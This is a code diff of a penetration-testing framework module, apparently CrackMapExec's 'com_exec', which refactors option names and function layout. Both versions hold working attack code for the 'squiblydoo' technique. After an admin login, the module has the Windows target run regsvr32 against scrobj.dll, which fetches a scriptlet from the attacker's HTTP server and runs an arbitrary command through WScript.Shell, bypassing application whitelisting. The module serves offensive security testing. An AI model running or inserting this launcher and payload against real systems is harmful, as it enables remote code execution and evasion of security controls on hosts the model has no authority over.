@@ -5,7 +5,7 @@ import os
 class CMEModule:
 
     '''
-        Executes a command using a COM scriptlet to bypass whitelisting (a.k.a squiblydoo)
+        Executes a command using a COM scriptlet to bypass whitelisting
 
         Based on the awesome research by @subtee
 
@@ -13,53 +13,53 @@ class CMEModule:
         http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html
     '''
 
-    name='com_exec' #Really tempted just to call this squiblydoo
+    name='com_exec'
 
     description = 'Executes a command using a COM scriptlet to bypass whitelisting'
 
     required_server='http'
 
-    chain_support = True
-
     def options(self, context, module_options):
         '''
-            COMMAND  Command to execute on the target system(s) (Required if CMDFILE isn't specified)
+            CMD      Command to execute on the target system(s) (Required if CMDFILE isn't specified)
             CMDFILE  File contaning the command to execute on the target system(s) (Required if CMD isn't specified)
         '''
 
-        if not 'COMMAND' in module_options and not 'CMDFILE' in module_options:
-            context.log.error('COMMAND or CMDFILE options are required!')
-            exit(1)
+        if not 'CMD' in module_options and not 'CMDFILE' in module_options:
+            context.log.error('CMD or CMDFILE options are required!')
+            sys.exit(1)
 
-        if 'COMMAND' in module_options and 'CMDFILE' in module_options:
-            context.log.error('COMMAND and CMDFILE are mutually exclusive!')
-            exit(1)
+        if 'CMD' in module_options and 'CMDFILE' in module_options:
+            context.log.error('CMD and CMDFILE are mutually exclusive!')
+            sys.exit(1)
 
-        if 'COMMAND' in module_options:
-            self.command = module_options['COMMAND']
+        if 'CMD' in module_options:
+            self.command = module_options['CMD']
 
         elif 'CMDFILE' in module_options:
             path = os.path.expanduser(module_options['CMDFILE'])
 
             if not os.path.exists(path):
                 context.log.error('Path to CMDFILE invalid!')
-                exit(1)
+                sys.exit(1)
 
             with open(path, 'r') as cmdfile:
                 self.command = cmdfile.read().strip()
 
         self.sct_name = gen_random_string(5)
 
-    def launcher(self, context, command):
-        launcher = 'regsvr32.exe /u /n /s /i:http://{}/{}.sct scrobj.dll'.format(context.localip, self.sct_name)
-        return launcher
-    
-    def payload(self, context, command):
-        command = command.replace('\\', '\\\\')
-        command = command.replace('"', '\\"')
-        command = command.replace("'", "\\'")
+    def on_admin_login(self, context, connection):
 
-        payload = '''<?XML version="1.0"?>
+        command = 'regsvr32.exe /u /n /s /i:http://{}/{}.sct scrobj.dll'.format(context.localip, self.sct_name)
+        connection.execute(command)
+        context.log.success('Executed command')
+
+    def on_request(self, context, request):
+        if '{}.sct'.format(self.sct_name) in request.path[1:]:
+            request.send_response(200)
+            request.end_headers()
+
+            com_script = '''<?XML version="1.0"?>
 <scriptlet>
 <registration
     description="Win32COMDebug"
@@ -69,29 +69,16 @@ class CMEModule:
 >
 <script language="JScript">
     <![CDATA[
-        var r = new ActiveXObject("WScript.Shell").Run('{}');
+        var r = new ActiveXObject("WScript.Shell").Run("{}");
     ]]>
 </script>
 </registration>
 <public>
     <method name="Exec"></method>
 </public>
-</scriptlet>'''.format(command)
+</scriptlet>'''.format(self.command)
 
-        context.log.debug('Generated payload:\n' + payload)
-        
-        return payload
-
-    def on_admin_login(self, context, connection, launcher, payload):
-        connection.execute(launcher)
-        context.log.success('Executed squiblydoo')
-
-    def on_request(self, context, request, launcher, payload):
-        if '{}.sct'.format(self.sct_name) in request.path[1:]:
-            request.send_response(200)
-            request.end_headers()
-
-            request.wfile.write(payload)
+            request.wfile.write(com_script)
             request.stop_tracking_host()
 
         else:
